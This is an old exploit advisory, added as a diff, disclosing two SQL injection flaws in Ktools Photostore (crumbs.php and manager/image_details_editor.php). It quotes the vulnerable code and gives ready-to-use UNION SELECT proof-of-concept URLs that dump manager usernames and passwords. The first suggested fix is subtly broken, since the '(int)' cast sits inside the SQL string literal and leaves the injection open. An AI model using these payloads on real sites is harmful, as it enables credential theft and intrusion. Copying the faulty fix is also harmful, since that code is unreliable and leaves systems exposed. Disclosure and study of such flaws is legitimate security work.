@@ -1,0 +1,73 @@
+
+                                 \#'#/
+                                 (-.-)
+   -------------------------oOO---(_)---OOo-------------------------
+   | Ktools Photostore <= v3.5.2 (crumbs.php) Remote SQL Injection |
+   |              (works only with magic quotes = off)             |
+   |                         coded by DNX                          |
+   -----------------------------------------------------------------
+[!] Discovered.: DNX
+[!] Vendor.....: http://www.ktools.net
+[!] Detected...: 27.04.2008
+[!] Reported...: 29.04.2008
+[!] Response...: xx.xx.2008
+
+[!] Background.: PhotoStore allows you to setup a complete photo selling 
+                 website on your server or hosting space in just minutes.
+
+[!] Price......: $295 Oo.
+
+[!] Bug........: $_GET['gid'] in crumbs.php near line 11
+
+                 05: if($_GET['gid']){
+                 
+                 08:   function crumbs($gid){
+                 09:     global $db, $crumb_array_name, $crumb_array_id;
+                 10:     
+                 11:     $ca_result = mysql_query("SELECT id,title,nest_under FROM photo_galleries where id = '$gid'", $db);
+                 
+                 23:   crumbs($_GET['gid']);
+
+                 A direct request on 'crumbs.php' doesn't work, because there is no valid database resource. So we have to look
+                 where 'crumbs.php' is included by an other script. In 'about_us.php' for example.
+
+[!] Tested on..: v3.4.3, v3.5.2
+
+[!] PoC........: http://127.0.0.1/photostore/about_us.php?gid=0'%20union%20select%201,concat(username,0x2f,password),3%20from%20mgr_users%20/*
+
+[!] Solution...: Replace the unsecure codeline with:
+
+                 $ca_result = mysql_query("SELECT id,title,nest_under FROM photo_galleries where id = '(int)$gid'", $db);
+
+
+
+                                        \#'#/
+                                        (-.-)
+   --------------------------------oOO---(_)---OOo--------------------------------
+   | Ktools Photostore <= v3.5.2 (image_details_editor.php) Remote SQL Injection |
+   |                                coded by DNX                                 |
+   -------------------------------------------------------------------------------
+[!] Discovered.: DNX
+[!] Vendor.....: http://www.ktools.net
+[!] Detected...: 26.04.2008
+[!] Reported...: 28.04.2008
+[!] Response...: 29.04.2008
+
+[!] Background.: PhotoStore allows you to setup a complete photo selling 
+                 website on your server or hosting space in just minutes.
+
+[!] Price......: $295 Oo.
+
+[!] Bug........: $_GET['id'] in manager/image_details_editor.php near line 60
+
+                 $image_result = mysql_query("SELECT * FROM uploaded_images where id =" . $_GET['id'], $db);
+
+[!] Tested on..: v2.5, v2.9.8, v3.1.0, v3.1.1, v3.2.0, v3.2.1, v3.4.0, v3.4.2, v3.4.3, v3.5.0, v3.5.1, v3.5.2
+
+[!] PoC........: http://127.0.0.1/photostore/manager/image_details_editor.php?id=-1%20union%20select%201,2,3,4,5,6,7,8,9,username,11,12,13,password,15,16%20FROM%20mgr_users
+
+[!] Solution...: Replace the unsecure codeline with:
+
+                 $image_result = mysql_query("SELECT * FROM uploaded_images where id =" . (int)$_GET['id'], $db);
+
+# milw0rm.com [2008-05-10]
